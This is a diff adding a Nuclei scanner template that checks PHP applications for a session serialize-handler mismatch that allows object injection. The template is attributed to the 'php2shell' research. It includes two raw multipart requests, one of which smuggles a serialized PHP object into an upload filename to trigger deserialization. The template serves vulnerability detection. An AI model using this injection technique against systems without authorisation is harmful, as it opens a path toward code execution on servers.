@@ -1,0 +1,97 @@
+id: php2shell-handler-mismatch
+
+info:
+  name: php2shell - Session Handler Mismatch Object Injection
+  author: ikow,opencode
+  severity: critical
+  description: |
+    Verifies the php2shell cross-directory session handler mismatch chain.
+    A session is written through an endpoint whose session.serialize_handler
+    is php_serialize with a pipe and serialized object embedded in the upload
+    filename. The same session is then read through an endpoint whose handler
+    is php. The php decoder splits the php_serialize payload at the injected
+    pipe, deserializes the object, and fails on the trailing data. Object
+    destructors fire during the cleanup path even when decoding fails, which
+    can lead to code execution when a POP gadget is available.
+
+    Required variables:
+      write_path  Endpoint using session.serialize_handler=php_serialize
+      read_path   Endpoint using session.serialize_handler=php
+
+    Both endpoints must share the same session.save_path. Detection relies on
+    PHP displaying request-startup warnings; with display_errors disabled the
+    mismatch still occurs but this template will not observe it. This chain is
+    part of the php2shell research tracked as CVE-2026-109618 /
+    CVE-2026-109619.
+  reference:
+    - https://github.com/ikow/php2shell-poc
+    - https://github.com/ikow/php2shell-poc/blob/main/docs/ANALYSIS.md
+    - https://github.com/ikow/php2shell-poc/blob/main/poc/verify_handler_mismatch.py
+  classification:
+    cve-id: CVE-2026-109618
+    cwe-id: CWE-502
+    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    cvss-score: 9.2
+  tags: cve,cve2026,php,php2shell,session,deserialization,handler-mismatch
+  metadata:
+    max-request: 2
+    verified: true
+    related-cve: CVE-2026-109619
+
+variables:
+  marker: "{{rand_base(10)}}"
+  sid: "nuclei{{rand_base(24)}}"
+  write_path: "/app/upload.php"
+  read_path: "/api/endpoint.php"
+
+http:
+  - raw:
+      - |
+        POST {{write_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----NucleiWrite{{marker}}
+        Connection: close
+
+        ------NucleiWrite{{marker}}
+        Content-Disposition: form-data; name="PHPSESSID"
+
+        {{sid}}
+        ------NucleiWrite{{marker}}
+        Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+        {{marker}}
+        ------NucleiWrite{{marker}}
+        Content-Disposition: form-data; name="f"; filename="x|O:8:\"stdClass\":0:{}"
+        Content-Type: text/plain
+
+        Z
+        ------NucleiWrite{{marker}}--
+      - |
+        POST {{read_path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----NucleiRead{{marker}}
+        Connection: close
+
+        ------NucleiRead{{marker}}
+        Content-Disposition: form-data; name="PHPSESSID"
+
+        {{sid}}
+        ------NucleiRead{{marker}}
+        Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+        {{marker}}
+        ------NucleiRead{{marker}}
+        Content-Disposition: form-data; name="f"; filename="dummy.txt"
+        Content-Type: text/plain
+
+        Z
+        ------NucleiRead{{marker}}--
+
+    disable-cookie: true
+    matchers:
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "Failed to decode session object"
+          - "Session object destruction failed"
